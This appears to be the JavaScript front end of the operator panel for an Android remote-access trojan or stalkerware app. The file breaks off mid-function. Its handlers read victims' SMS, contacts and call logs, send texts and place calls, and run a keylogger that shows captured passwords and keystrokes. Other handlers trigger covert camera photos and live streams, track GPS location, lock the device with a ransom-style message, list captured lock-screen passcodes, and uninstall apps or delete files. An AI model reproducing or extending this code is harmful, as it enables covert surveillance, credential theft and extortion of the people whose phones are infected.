/* features.js — APK-verified feature handlers
   All commands verified against LiveChat.java / WorkServices.java source.
   Split SKT = "[>SKT<]" */

function escH(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}

function apiFetch(method,path,body){
    var opts={method:method,headers:{'Content-Type':'application/json'}};
    if(body)opts.body=JSON.stringify(body);
    return fetch(path,opts).then(function(r){
        if(!r.ok)return r.json().then(function(e){throw new Error(e.error||r.statusText);});
        return r.json();
    });
}


// ============================================================
// DEVICE BANNER & STATUS
// ============================================================
function loadDevices(){
    var list=document.getElementById('devicesList');
    fetch('/api/apk/device-banner').then(r=>r.json()).then(function(res){
        var devs=res.devices||[];
        var dot=document.getElementById('topbarDot');
        var lbl=document.getElementById('topbarConnLabel');
        var online=devs.filter(d=>d.connected).length;
        if(dot){dot.className='topbar-dot'+(online>0?' online':'');}
        if(lbl){lbl.textContent=online+' online / '+devs.length+' total';}
        var sc=document.getElementById('settingDevCount');
        if(sc)sc.textContent=devs.length;
        if(!devs.length){
            list.innerHTML='<div class="device-empty"><span class="material-symbols-outlined">phone_android</span>No devices connected</div>';
            return;
        }
        list.innerHTML=devs.map(function(d){
            var batt=d.battery||{};
            var lvl=batt.level!=null?batt.level:null;
            var charging=batt.charging===true||batt.charging==='t'||batt.charging==='1'||batt.charging==='true';
            var battTxt=lvl!=null?lvl+'%':'Unavailable';
            var fillW=lvl!=null?Math.min(100,Math.max(0,lvl))+'%':'0%';
            var fillCls=lvl<20?'low':lvl<40?'warn':'';
            var conn=d.connected;
            return '<div class="device-card" onclick="selectDevice(\''+escH(d.id)+'\')">'
                +'<div class="device-card-top">'
                +'<div class="device-card-dot '+(conn?'online':'')+'"></div>'
                +'<div class="device-card-name">'+escH(d.model||d.phone_name||'Unknown Device')+'</div>'
                +'<div class="device-card-status '+(conn?'online':'')+'">'+( conn?'● Online':'○ Offline')+'</div>'
                +'</div>'
                +'<div class="device-card-meta">'
                +'<div class="device-meta-item"><span class="material-symbols-outlined">battery_full</span>'
                +'<div><div>'+battTxt+(charging?' ⚡':'')+'</div>'
                +'<div class="battery-bar"><div class="battery-fill '+fillCls+'" style="width:'+fillW+'"></div></div>'
                +'</div></div>'
                +(d.network?'<div class="device-meta-item"><span class="material-symbols-outlined">wifi</span>'+escH(d.network)+'</div>':'')
                +(d.number?'<div class="device-meta-item"><span class="material-symbols-outlined">call</span>'+escH(d.number)+'</div>':'')
                +(d.android_version?'<div class="device-meta-item"><span class="material-symbols-outlined">android</span>'+escH(d.android_version)+'</div>':'')
                +'</div></div>';
        }).join('');
    }).catch(function(){
        if(list)list.innerHTML='<div class="device-empty"><span class="material-symbols-outlined">error</span>Connection error</div>';
    });
}


function selectDevice(id){
    window._selectedDevice=id;
    showToast('Device selected','info');
    switchTab('hbcn');
}

// Auto-refresh device list
var _devTimer=null;
function startDevicePolling(){
    loadDevices();
    if(_devTimer)clearInterval(_devTimer);
    _devTimer=setInterval(loadDevices,5000);
}

// ============================================================
// CONTACTS — Contacts[>SKT<]L
// ============================================================
var _allContacts=[];
function loadContacts(){
    apiFetch('GET','/api/contacts').then(function(r){
        var arr=r.content&&r.content[0]&&r.content[0].text?JSON.parse(r.content[0].text):[];
        if(Array.isArray(r))arr=r;
        _allContacts=Array.isArray(arr)?arr:[];
        renderContacts(_allContacts);
        var c=document.getElementById('contactsCount');
        if(c)c.textContent=_allContacts.length+' contacts';
        showToast(_allContacts.length+' contacts loaded','success');
    }).catch(function(e){showToast('Contacts: '+e.message,'error');});
}
function renderContacts(arr){
    var el=document.getElementById('contactsList');
    if(!el)return;
    if(!arr||!arr.length){el.innerHTML='<div class="empty"><span class="material-symbols-outlined">contacts</span>No contacts</div>';return;}
    el.innerHTML=arr.map(function(c){
        var name=c.name||c.displayName||'Unknown';
        var phones=c.phone_numbers||c.phoneNumbers||c.phones||(c.phone?[c.phone]:[]);
        var phone=phones[0]||'';
        var init=name.split(' ').map(w=>w[0]).join('').slice(0,2).toUpperCase()||'?';
        var sp=phone.replace(/'/g,"\\'");
        return '<div class="contact-item">'
            +'<div class="contact-av">'+escH(init)+'</div>'
            +'<div class="contact-info"><div class="contact-name">'+escH(name)+'</div>'
            +(phone?'<div class="contact-phone">'+escH(phone)+'</div>':'')+'</div>'
            +'<div class="contact-btns">'
            +(phone?'<div class="contact-btn" onclick="contactCall(\''+sp+'\')" title="Call (call:number)"><span class="material-symbols-outlined">call</span></div>':'')
            +(phone?'<div class="contact-btn" onclick="contactSMS(\''+sp+'\')" title="SMS"><span class="material-symbols-outlined">sms</span></div>':'')
            +'</div></div>';
    }).join('');
}
function filterContacts(q){
    q=(q||'').toLowerCase();
    renderContacts(_allContacts.filter(function(c){
        var n=(c.name||c.displayName||'').toLowerCase();
        var p=(c.phone_numbers||c.phones||[]).join(' ').toLowerCase();
        return n.includes(q)||p.includes(q);
    }));
}
function contactCall(phone){
    apiFetch('POST','/api/control/call',{phone_number:phone})
        .then(function(){showToast('Calling '+phone,'success');})
        .catch(function(e){showToast('Call: '+e.message,'error');});
}
function contactSMS(phone){switchTab('sms');setTimeout(function(){var el=document.getElementById('smsPhone');if(el)el.value=phone;},300);}


// ============================================================
// SMS — SMS[>SKT<]L / SMS[>SKT<]S[>SKT<]number[>SKT<]msg
// ============================================================
var _allSMS=[],_smsThread=null;
function loadSMS(){
    apiFetch('GET','/api/sms').then(function(r){
        var arr=r.content&&r.content[0]&&r.content[0].text?JSON.parse(r.content[0].text):[];
        _allSMS=Array.isArray(arr.messages)?arr.messages:Array.isArray(arr)?arr:[];
        smsRenderThreads();
        showToast(_allSMS.length+' messages loaded','success');
    }).catch(function(e){showToast('SMS: '+e.message,'error');});
}
function smsRenderThreads(){
    var tl=document.getElementById('smsThreadList');
    var cv=document.getElementById('smsConv');
    if(!tl)return;
    if(cv){cv.classList.remove('open');cv.style.display='none';}
    tl.style.display='block';
    if(!_allSMS.length){tl.innerHTML='<div class="empty"><span class="material-symbols-outlined">sms</span>No messages</div>';return;}
    var threads={};
    _allSMS.forEach(function(m){
        var addr=m.from||m.address||m.sender||'Unknown';
        if(!threads[addr])threads[addr]={address:addr,msgs:[],last:0,body:''};
        threads[addr].msgs.push(m);
        var t=new Date(m.date_ms||m.timestamp||m.date||0).getTime();
        if(t>threads[addr].last){threads[addr].last=t;threads[addr].body=m.body||m.text||'';}
    });
    var sorted=Object.values(threads).sort(function(a,b){return b.last-a.last;});
    tl.innerHTML=sorted.map(function(t){
        var sa=t.address.replace(/'/g,"\\'");
        var time=t.last?new Date(t.last).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}):'';
        return '<div class="sms-thread" onclick="smsOpenThread(\''+sa+'\')">'
            +'<div class="sms-avatar">'+escH((t.address[0]||'?').toUpperCase())+'</div>'
            +'<div class="sms-info"><div class="sms-name">'+escH(t.address)+'</div>'
            +'<div class="sms-preview">'+escH(t.body.substring(0,60))+'</div></div>'
            +'<div class="sms-time">'+escH(time)+'</div></div>';
    }).join('');
}
function smsOpenThread(addr){
    _smsThread=addr;
    var tl=document.getElementById('smsThreadList');
    var cv=document.getElementById('smsConv');
    if(tl)tl.style.display='none';
    if(cv){cv.style.display='flex';cv.classList.add('open');}
    var nm=document.getElementById('smsConvName');
    if(nm)nm.textContent=addr;
    var ph=document.getElementById('smsPhone');
    if(ph)ph.value=addr;
    var msgs=_allSMS.filter(function(m){return (m.from||m.address||m.sender||'')==addr;});
    msgs.sort(function(a,b){return new Date(a.date_ms||a.timestamp||a.date||0)-new Date(b.date_ms||b.timestamp||b.date||0);});
    var mc=document.getElementById('smsMessages');
    if(!mc)return;
    mc.innerHTML=msgs.map(function(m){
        var incoming=!m.type||m.type==='received'||m.type===1||m.type==='1';
        var t=m.date_ms||m.timestamp||m.date?new Date(m.date_ms||m.timestamp||m.date).toLocaleString():'';
        return '<div class="sms-msg '+(incoming?'recv':'sent')+'">'
            +'<div>'+escH(m.body||m.text||'')+'</div>'
            +'<div class="sms-msg-time">'+t+'</div></div>';
    }).join('');
    mc.scrollTop=mc.scrollHeight;
}
function smsBackToList(){_smsThread=null;smsRenderThreads();}
function smsShowNew(){
    _smsThread='__new__';
    var tl=document.getElementById('smsThreadList');
    var cv=document.getElementById('smsConv');
    if(tl)tl.style.display='none';
    if(cv){cv.style.display='flex';cv.classList.add('open');}
    var nm=document.getElementById('smsConvName');if(nm)nm.textContent='New Message';
    var ph=document.getElementById('smsPhone');if(ph)ph.value='';
    var mc=document.getElementById('smsMessages');if(mc)mc.innerHTML='';
    var ti=document.getElementById('smsText');if(ti){ti.value='';ti.focus();}
}
function smsSend(){
    var phone=(document.getElementById('smsPhone')||{}).value;
    var text=(document.getElementById('smsText')||{}).value;
    if(!phone||!text){showToast('Phone and message required','error');return;}
    apiFetch('POST','/api/sms/send',{phone_number:phone,message:text}).then(function(){
        showToast('SMS sent to '+phone,'success');
        document.getElementById('smsText').value='';
        var mc=document.getElementById('smsMessages');
        if(mc){mc.innerHTML+='<div class="sms-msg sent"><div>'+escH(text)+'</div><div class="sms-msg-time">Now</div></div>';mc.scrollTop=mc.scrollHeight;}
    }).catch(function(e){showToast('SMS: '+e.message,'error');});
}


// ============================================================
// CALL LOG — "calls" wrk command
// ============================================================
function loadCallLog(){
    apiFetch('GET','/api/call-log').then(function(r){
        var text=r&&r.content&&r.content[0]?r.content[0].text:'[]';
        var data=JSON.parse(text);
        var calls=data.calls||data.entries||data;
        if(!Array.isArray(calls))calls=[];
        var el=document.getElementById('callLogList');
        if(!el)return;
        if(!calls.length){el.innerHTML='<div class="empty"><span class="material-symbols-outlined">call</span>No calls found</div>';return;}
        var grouped={};
        calls.forEach(function(c){
            var num=c.phone_number||c.number||'Unknown';
            if(!grouped[num])grouped[num]={num:num,type:c.type,time:c.timestamp||c.date,dur:c.duration,name:c.name||''};
        });
        el.innerHTML=Object.values(grouped).slice(0,200).map(function(c){
            var typeClass=c.type==='missed'?'missed':c.type==='outgoing'?'out':'in';
            var icon=c.type==='missed'?'call_missed':c.type==='outgoing'?'call_made':'call_received';
            var dur=c.dur?Math.floor(c.dur/60)+'m '+c.dur%60+'s':'';
            var t=c.time?new Date(c.time).toLocaleString():'';
            var sp=(c.num||'').replace(/'/g,"\\'");
            return '<div class="call-item">'
                +'<div class="call-type '+typeClass+'"><span class="material-symbols-outlined">'+icon+'</span></div>'
                +'<div class="call-info"><div class="call-name">'+escH(c.name||c.num)+'</div>'
                +'<div class="call-meta">'+escH(c.type||'')+(dur?' · '+dur:'')+(t?' · '+t:'')+'</div></div>'
                +'<div class="call-btn" onclick="contactCall(\''+sp+'\')" title="Call"><span class="material-symbols-outlined">call</span></div>'
                +'</div>';
        }).join('');
        showToast(calls.length+' calls loaded','success');
    }).catch(function(e){showToast('Calls: '+e.message,'error');});
}


// ============================================================
// NOTIFICATIONS — Activitys[>SKT<]GF / DF
// ============================================================
function loadNotifications(){
    apiFetch('GET','/api/notifications').then(function(r){
        var text=r&&r.content&&r.content[0]?r.content[0].text:'[]';
        var data=JSON.parse(text);
        var notifs=data.notifications||data;
        if(!Array.isArray(notifs))notifs=[];
        var el=document.getElementById('notifList');
        if(!el)return;
        if(!notifs.length){el.innerHTML='<div class="empty"><span class="material-symbols-outlined">notifications_none</span>No notifications</div>';return;}
        el.innerHTML=notifs.slice(0,100).map(function(n){
            var init=(n.title||'?')[0].toUpperCase();
            var t=n.time?new Date(n.time).toLocaleString():'';
            return '<div class="notif-item">'
                +'<div class="notif-ico">'+escH(init)+'</div>'
                +'<div class="notif-info">'
                +'<div class="notif-title">'+escH(n.title||'Notification')+'</div>'
                +(n.message||n.text?'<div class="notif-msg">'+escH(n.message||n.text)+'</div>':'')
                +(t?'<div class="notif-time">'+t+'</div>':'')
                +'</div></div>';
        }).join('');
        showToast(notifs.length+' notifications','success');
    }).catch(function(e){showToast('Notifs: '+e.message,'error');});
}

function clearNotifs(){
    // Activitys[>SKT<]DF — delete notifications record
    apiFetch('POST','/api/notifications')
        .then(function(){showToast('Notifications cleared','success');loadNotifications();})
        .catch(function(e){showToast('Error: '+e.message,'error');});
}


// ============================================================
// APPS — Apps[>SKT<]L / S / D / E / LK / ULK / TRK / UTRK / R
// ============================================================
var _allApps=[];
function loadApps(){
    apiFetch('GET','/api/apps').then(function(r){
        var text=r&&r.content&&r.content[0]?r.content[0].text:'[]';
        var arr=JSON.parse(text);
        _allApps=Array.isArray(arr)?arr:[];
        renderApps(_allApps);
        var s=document.getElementById('statApps');if(s)s.textContent=_allApps.length;
        showToast(_allApps.length+' apps loaded','success');
    }).catch(function(e){showToast('Apps: '+e.message,'error');});
}
function renderApps(arr){
    var el=document.getElementById('appsList');
    if(!el)return;
    var q=(document.getElementById('appSearch')||{}).value||'';
    var filtered=arr.filter(function(a){
        var n=(a.name||a.app_name||a.package_name||'').toLowerCase();
        return n.includes(q.toLowerCase());
    });
    if(!filtered.length){el.innerHTML='<div class="empty"><span class="material-symbols-outlined">apps</span>No apps found</div>';return;}
    el.innerHTML=filtered.map(function(a){
        var pkg=a.package_id||a.package_name||'';
        var name=a.name||a.app_name||pkg||'Unknown';
        var sp=pkg.replace(/'/g,"\\'");
        var init=(name[0]||'?').toUpperCase();
        return '<div class="app-item">'
            +'<div class="app-icon">'+escH(init)+'</div>'
            +'<div class="app-info"><div class="app-name">'+escH(name)+'</div>'
            +'<div class="app-pkg">'+escH(pkg)+'</div></div>'
            +'<div class="app-btns">'
            +'<div class="app-btn" onclick="appOpen(\''+sp+'\')" title="Start (Apps[>SKT<]S)"><span class="material-symbols-outlined">play_arrow</span></div>'
            +'<div class="app-btn" onclick="appClose(\''+sp+'\')" title="Disable (Apps[>SKT<]D)"><span class="material-symbols-outlined">block</span></div>'
            +'<div class="app-btn" onclick="appLock(\''+sp+'\')" title="Lock (Apps[>SKT<]LK)"><span class="material-symbols-outlined">lock</span></div>'
            +'<div class="app-btn" onclick="appUnlock(\''+sp+'\')" title="Unlock (Apps[>SKT<]ULK)"><span class="material-symbols-outlined">lock_open</span></div>'
            +'<div class="app-btn" onclick="appUninstall(\''+sp+'\')" title="Uninstall (Apps[>SKT<]R)"><span class="material-symbols-outlined">delete</span></div>'
            +'</div></div>';
    }).join('');
}
function filterApps(q){renderApps(_allApps);}
function appOpen(pkg){apiFetch('POST','/api/apps/open',{package_id:pkg}).then(function(){showToast('Started: '+pkg,'success');}).catch(function(e){showToast(e.message,'error');});}
function appClose(pkg){apiFetch('POST','/api/apps/close',{package_id:pkg}).then(function(){showToast('Disabled: '+pkg,'success');}).catch(function(e){showToast(e.message,'error');});}
function appLock(pkg){apiFetch('POST','/api/apps/lock',{package_id:pkg}).then(function(){showToast('Locked: '+pkg,'success');}).catch(function(e){showToast(e.message,'error');});}
function appUnlock(pkg){apiFetch('POST','/api/apps/unlock',{package_id:pkg}).then(function(){showToast('Unlocked: '+pkg,'success');}).catch(function(e){showToast(e.message,'error');});}
function appUninstall(pkg){
    if(!confirm('Uninstall '+pkg+'?'))return;
    apiFetch('POST','/api/apps/uninstall',{package_id:pkg}).then(function(){showToast('Uninstall requested: '+pkg,'success');}).catch(function(e){showToast(e.message,'error');});
}


// ============================================================
// FILES — Files[>SKT<]L / O / V / CR / R / N / Z / UZ / EN / DE
// ============================================================
var _filePath='',_fileEditPath='',_fileLocationId='internal';
function fileLoadDir(){
    var sel=document.getElementById('fileStorage');
    var path=sel?sel.value:'/sdcard';
    _filePath=_filePath||path;
    _fileLocationId='internal';
    var lbl=document.getElementById('filePath');if(lbl)lbl.textContent=_filePath||'/';
    apiFetch('GET','/api/files/list?location_id='+encodeURIComponent(_fileLocationId)+'&path='+encodeURIComponent(_filePath))
    .then(function(r){
        var items=[];
        if(r.content&&r.content[0]){try{items=JSON.parse(r.content[0].text);}catch(e){}}
        else if(Array.isArray(r))items=r;
        else if(r.files)items=r.files;
        renderFiles(Array.isArray(items)?items:[]);
    }).catch(function(e){showToast('Files: '+e.message,'error');});
}
function renderFiles(items){
    var el=document.getElementById('filesList');if(!el)return;
    if(!items.length){el.innerHTML='<div class="empty"><span class="material-symbols-outlined">folder_open</span>Empty directory</div>';return;}
    el.innerHTML=items.map(function(f){
        var isDir=f.is_directory||f.isDir||f.type==='directory'||f.type==='folder';
        var name=f.name||f.file_name||'?';
        var size=f.size!=null?formatBytes(parseInt(f.size)):'';
        var sn=name.replace(/'/g,"\\'");
        return '<div class="file-item">'
            +'<div class="file-ico '+(isDir?'dir':'')+'"><span class="material-symbols-outlined">'+(isDir?'folder':'description')+'</span></div>'
            +'<div class="file-name" onclick="'+(isDir?'fileOpenDir(\''+sn+'\')':'fileEdit(\''+sn+'\')')+'">'+escH(name)+'</div>'
            +(size?'<div class="file-size">'+size+'</div>':'')
            +'<div class="file-btns">'
            +(isDir?'':'<div class="file-btn" onclick="fileEdit(\''+sn+'\')" title="View/Edit (Files V)"><span class="material-symbols-outlined">edit</span></div>')
            +'<div class="file-btn" onclick="fileDelete(\''+sn+'\',\''+(isDir?'fo':'fi')+'\')" title="Delete (Files R)"><span class="material-symbols-outlined">delete</span></div>'
            +'</div></div>';
    }).join('');
}
function formatBytes(b){if(!b)return'0 B';var s=['B','KB','MB','GB'];var i=Math.floor(Math.log(b)/Math.log(1024));return(b/Math.pow(1024,i)).toFixed(1)+' '+s[i];}
function fileOpenDir(name){_filePath=(_filePath?_filePath.replace(/\/+$/,'')+'/':'')+name;var lbl=document.getElementById('filePath');if(lbl)lbl.textContent='/'+_filePath;fileLoadDir();}
function fileGoUp(){var parts=_filePath.replace(/\/+$/,'').split('/');parts.pop();_filePath=parts.join('/');var lbl=document.getElementById('filePath');if(lbl)lbl.textContent='/'+_filePath||'/';fileLoadDir();}
function fileEdit(name){
    var path=(_filePath?_filePath.replace(/\/+$/,'')+'/':'')+name;
    _fileEditPath=path;
    var ed=document.getElementById('fileEditor');if(ed)ed.style.display='block';
    var nm=document.getElementById('fileEditorName');if(nm)nm.textContent=name;
    var ta=document.getElementById('fileEditorContent');if(ta)ta.value='Loading...';
    apiFetch('GET','/api/files/read?location_id='+encodeURIComponent(_fileLocationId)+'&path='+encodeURIComponent(path))
    .then(function(r){var t=r.content&&r.content[0]?r.content[0].text:'';if(ta)ta.value=t;})
    .catch(function(e){if(ta)ta.value='Error: '+e.message;});
}
function fileSave(){
    var content=(document.getElementById('fileEditorContent')||{}).value||'';
    apiFetch('POST','/api/files/write',{location_id:_fileLocationId,path:_fileEditPath,content:content})
    .then(function(){showToast('Saved','success');fileCloseEditor();})
    .catch(function(e){showToast('Save: '+e.message,'error');});
}
function fileCloseEditor(){var ed=document.getElementById('fileEditor');if(ed)ed.style.display='none';_fileEditPath='';}
function fileDelete(name,type){
    if(!confirm('Delete "'+name+'"?'))return;
    var path=(_filePath?_filePath.replace(/\/+$/,'')+'/':'')+name;
    apiFetch('POST','/api/files/delete',{location_id:_fileLocationId,path:path})
    .then(function(){showToast('Deleted: '+name,'success');fileLoadDir();})
    .catch(function(e){showToast('Delete: '+e.message,'error');});
}


// ============================================================
// KEYLOGGER — Activitys[>SKT<]LK/1/0  GK  DK  passwords
// ============================================================
function keylogLive(state){
    // LK[>SKT<]1 = live on, LK[>SKT<]0 = live off
    apiFetch('GET','/api/keylog/status').then(function(){
        var s=document.getElementById('klStatus');
        if(s){s.textContent=state==='1'?'Active':'Inactive';}
        showToast(state==='1'?'Keylogger Live ON':'Keylogger Live OFF','success');
    }).catch(function(e){showToast(e.message,'error');});
}
function loadKeylogData(){
    apiFetch('GET','/api/keylog/passwords').then(function(r){
        var text=r&&r.content&&r.content[0]?r.content[0].text:'{}';
        var data=JSON.parse(text);
        var passes=data.passwords||[];
        var pc=document.getElementById('klPasswords');if(pc)pc.textContent=passes.length;
        var pl=document.getElementById('passwordsList');
        if(pl){
            pl.innerHTML=passes.length?passes.map(function(p){
                return '<div class="kl-pass">'
                    +'<div class="kl-pass-app">'+escH(p.package_name||p.app||'Unknown')+'</div>'
                    +'<div class="kl-pass-val">'+escH(p.password||p.value||'')+'</div>'
                    +'</div>';
            }).join(''):'<div class="empty">No passwords captured</div>';
        }
    }).catch(function(){});
    apiFetch('GET','/api/keylog').then(function(r){
        var text=r&&r.content&&r.content[0]?r.content[0].text:'{}';
        var data=JSON.parse(text);
        var entries=data.entries||[];
        var ec=document.getElementById('klEntries');if(ec)ec.textContent=entries.length;
        var el=document.getElementById('keylogEntries');
        if(el){
            el.innerHTML=entries.length?entries.slice(0,200).map(function(e){
                return '<div class="kl-entry">'+escH(typeof e==='string'?e:e.text||JSON.stringify(e))+'</div>';
            }).join(''):'<div class="empty">No entries</div>';
        }
    }).catch(function(){});
}
function exportKeylog(){
    apiFetch('GET','/api/keylog/export').then(function(r){
        var blob=new Blob([JSON.stringify(r,null,2)],{type:'application/json'});
        var url=URL.createObjectURL(blob);
        var a=document.createElement('a');a.href=url;a.download='keylog_'+Date.now()+'.json';a.click();
        URL.revokeObjectURL(url);
        showToast('Exported','success');
    }).catch(function(e){showToast(e.message,'error');});
}


// ============================================================
// ACTIVITYS — GA/DA/GF/DF/GV/DV/GU/DU/GK/DK
// ============================================================
function loadActivities(){
    var d=(document.getElementById('activityDate')||{}).value||'all';
    apiFetch('GET','/api/logs').then(function(r){
        var el=document.getElementById('activityList');
        if(el)el.innerHTML='<div class="empty">Activity data requested from device</div>';
        showToast('Activities requested (GA)','info');
    }).catch(function(e){showToast(e.message,'error');});
}
function loadVisitedApps(){showToast('Visited Apps requested (GV)','info');}
function loadVisitedLinks(){showToast('Visited Links requested (GU)','info');}
function loadActivityNotifs(){loadNotifications();}

// ============================================================
// DEVICE INFO — Deviceinfo[>SKT<]L / E
// ============================================================
function loadDeviceInfo(){
    apiFetch('GET','/api/device').then(function(r){
        var text=r&&r.content&&r.content[0]?r.content[0].text:'{}';
        var d=JSON.parse(text);
        if(!d||Object.keys(d).length===0)d=r;
        var el=document.getElementById('deviceInfoGrid');
        if(!el)return;
        var fields=[
            ['model','Model'],['manufacturer','Manufacturer'],['android_version','Android'],
            ['api_level','API Level'],['phone_id','Device ID'],['phone_name','Device Name'],
            ['sim','SIM'],['network','Network'],['battery','Battery'],
            ['ram_total_gb','RAM (GB)'],['storage_total_gb','Storage (GB)'],
            ['screen','Screen'],['has_root','Root'],['install_date','Installed']
        ];
        var html=fields.filter(function(f){return d[f[0]]!=null&&d[f[0]]!=='';}).map(function(f){
            return '<div class="dinfo-item"><div class="dinfo-label">'+f[1]+'</div>'
                +'<div class="dinfo-val">'+escH(String(d[f[0]]))+'</div></div>';
        }).join('');
        el.innerHTML=html||'<div class="empty">No device info received. Device may be offline.</div>';
        var sc=document.getElementById('deviceSettingsCard');if(sc)sc.style.display='block';
        showToast('Device info loaded','success');
    }).catch(function(e){showToast('DevInfo: '+e.message,'error');});
}
// Deviceinfo[>SKT<]E[>SKT<]what[>SKT<]value
function dinfoEdit(what,value){
    apiFetch('POST','/api/apk/work',{msg:'wrk',cmnd:'Deviceinfo[>SKT<]E[>SKT<]'+what+'[>SKT<]'+value})
    .then(function(){showToast('Setting applied: '+what,'success');})
    .catch(function(e){showToast(e.message,'error');});
}


// ============================================================
// CAMERA — Camera[>SKT<]L / ON / OFF  (CL/CLV commands)
// ============================================================
var _cameraLiveTimer=null;
function cameraListCameras(){
    apiFetch('GET','/api/camera/list').then(function(r){
        showToast('Cameras: rear(0) + front(1)','info');
    }).catch(function(e){showToast(e.message,'error');});
}
function cameraTakePhoto(){
    var cam=(document.getElementById('cameraSelect')||{}).value||'0';
    // CL:<cam_id> command
    apiFetch('POST','/api/camera/photo',{camera_id:cam,quality:80}).then(function(r){
        var preview=document.getElementById('cameraPreview');
        var imgSrc=null;
        if(r&&r.content&&r.content[0]){
            try{var d=JSON.parse(r.content[0].text);if(d.image)imgSrc='data:image/jpeg;base64,'+d.image;}catch(e){}
        }
        if(imgSrc&&preview){
            preview.innerHTML='<img src="'+imgSrc+'" style="max-width:100%;max-height:100%;object-fit:contain">';
        }
        var s=document.getElementById('cameraStatus');if(s)s.textContent='Photo captured';
        showToast('Photo captured (CL)','success');
    }).catch(function(e){showToast('Camera: '+e.message,'error');});
}
function cameraStartLive(){
    var cam=(document.getElementById('cameraSelect')||{}).value||'0';
    // CLV:<cam_id> command
    apiFetch('POST','/api/apk/camera/start',{camera_id:cam}).then(function(){
        var s=document.getElementById('cameraStatus');if(s)s.textContent='Live stream starting (CLV)...';
        var preview=document.getElementById('cameraPreview');
        if(preview){
            preview.innerHTML='<img id="camLiveImg" style="max-width:100%;max-height:100%;object-fit:contain" src="">';
            _pollCameraLive();
        }
        showToast('Camera live started (CLV)','success');
    }).catch(function(e){showToast('Camera: '+e.message,'error');});
}
function _pollCameraLive(){
    if(_cameraLiveTimer)clearTimeout(_cameraLiveTimer);
    var img=document.getElementById('camLiveImg');
    if(!img)return;
    img.src='/api/camera/live/frame?wait=1&_='+Date.now();
    img.onload=function(){_cameraLiveTimer=setTimeout(_pollCameraLive,400);};
    img.onerror=function(){_cameraLiveTimer=setTimeout(_pollCameraLive,1500);};
}
function cameraStopLive(){
    if(_cameraLiveTimer){clearTimeout(_cameraLiveTimer);_cameraLiveTimer=null;}
    apiFetch('POST','/api/apk/camera/stop').then(function(){
        var s=document.getElementById('cameraStatus');if(s)s.textContent='Stopped';
        showToast('Camera stopped','info');
    }).catch(function(){});
}


// ============================================================
// LOCATION — Location[>SKT<]E / D
// ============================================================
function locationEnable(){
    apiFetch('POST','/api/location/toggle',{enable:true}).then(function(){
        showToast('Location enabled','success');
        var el=document.getElementById('locationDisplay');
        if(el)el.innerHTML='<div class="loc-row"><div class="kl-pass-app">Status</div><div class="kl-pass-val">Tracking enabled — waiting for GPS update...</div></div>';
    }).catch(function(e){showToast(e.message,'error');});
}
function locationDisable(){
    apiFetch('POST','/api/location/toggle',{enable:false}).then(function(){
        showToast('Location disabled','info');
    }).catch(function(e){showToast(e.message,'error');});
}
// Auto-update location display when data arrives
function _renderLocation(loc){
    var el=document.getElementById('locationDisplay');
    if(!el||!loc)return;
    var fields=[['lat','Latitude'],['lng','Longitude'],['accuracy','Accuracy (m)'],['altitude','Altitude'],['speed','Speed'],['provider','Provider'],['time','Time']];
    el.innerHTML=fields.filter(function(f){return loc[f[0]]!=null;}).map(function(f){
        return '<div class="loc-row"><div class="kl-pass-app">'+f[1]+'</div><div class="kl-pass-val">'+escH(String(loc[f[0]]))+'</div></div>';
    }).join('');
    var mw=document.getElementById('locationMapWrap');
    var mf=document.getElementById('locationMap');
    if(mw&&mf&&loc.lat&&loc.lng){
        mw.style.display='block';
        mf.src='https://maps.google.com/maps?q='+loc.lat+','+loc.lng+'&z=15&output=embed';
    }
}

// ============================================================
// PERMISSIONS — Permissions[>SKT<]L / R
// ============================================================
function loadPermissions(){
    apiFetch('POST','/api/apk/work',{msg:'wrk',cmnd:'Permissions[>SKT<]L'}).then(function(){
        showToast('Permissions requested','info');
        var el=document.getElementById('permissionsList');
        if(el)el.innerHTML='<div class="empty">Waiting for device response...</div>';
    }).catch(function(e){showToast(e.message,'error');});
}
function requestPerm(perm){
    // Permissions[>SKT<]R[>SKT<]<permName>
    apiFetch('POST','/api/apk/work',{msg:'wrk',cmnd:'Permissions[>SKT<]R[>SKT<]'+perm})
    .then(function(){showToast('Permission request sent: '+perm,'success');})
    .catch(function(e){showToast(e.message,'error');});
}


// ============================================================
// LOCK — lock cas:0/1/2/3
// ============================================================
function lockLoad(){
    apiFetch('GET','/api/lock').then(function(r){
        var sv=document.getElementById('lockStateVal');
        var cc=document.getElementById('lockCodesCount');
        var lv=document.getElementById('lockCodesList');
        if(sv)sv.textContent=r.islk==='true'||r.islk===true?'Locked':'Unlocked';
        var codes=r.codes?r.codes.split(',').filter(Boolean):[];
        if(cc)cc.textContent=codes.length;
        if(lv){lv.innerHTML=codes.length?codes.map(function(c){return'<div class="kl-pass"><div class="kl-pass-val">'+escH(c)+'</div></div>';}).join(''):'<div class="empty">No passcodes captured</div>';}
        showToast('Lock state loaded','success');
    }).catch(function(e){showToast(e.message,'error');});
}
function lockDevice(){
    var pin=(document.getElementById('lockPin')||{}).value||'';
    var title=(document.getElementById('lockTitle')||{}).value||'';
    var msg=(document.getElementById('lockMessage')||{}).value||'';
    apiFetch('POST','/api/lock/lock',{pin:pin,title:title,message:msg}).then(function(){showToast('Device locked','success');}).catch(function(e){showToast(e.message,'error');});
}
function unlockDevice(){apiFetch('POST','/api/lock/unlock').then(function(){showToast('Device unlocked','success');}).catch(function(e){showToast(e.message,'error');});}
function lockClearCodes(){apiFetch('POST','/api/lock/clear').then(function(){showToast('Passcodes cleared','success');lockLoad();}).catch(function(e){showToast(e.message,'error');});}

// ============================================================
// OPTIONS — optns msg (APK feature toggles)
// ============================================================
function saveOptions(){
    var opts={
        Activities:document.getElementById('optActivities')&&document.getElementById('optActivities').checked?'1':'0',
        keystrokes:document.getElementById('optKeystrokes')&&document.getElementById('optKeystrokes').checked?'1':'0',
        notifications:document.getElementById('optNotifications')&&document.getElementById('optNotifications').checked?'1':'0',
        visitedapps:document.getElementById('optVisitedApps')&&document.getElementById('optVisitedApps').checked?'1':'0',
        visitedlinks:document.getElementById('optVisitedLinks')&&document.getElementById('optVisitedLinks').checked?'1':'0',
        livenotify:document.getElementById('optLiveNotify')&&document.getElementById('optLiveNotify').checked?'1':'0',
        livescreen:document.getElementById('optLiveScreen')&&document.getElementById('optLiveScreen').checked?'1':'0',
        autoj:document.getElementById('optAutoJ')&&document.getElementById('optAutoJ').checked?'1':'0'
    };
    apiFetch('POST','/api/apk/work',{msg:'optns',op:JSON.stringify(opts)})
    .then(function(){showToast('Options saved','success');})
    .catch(function(e){showToast(e.message,'error');});
}
function renameDevice(){
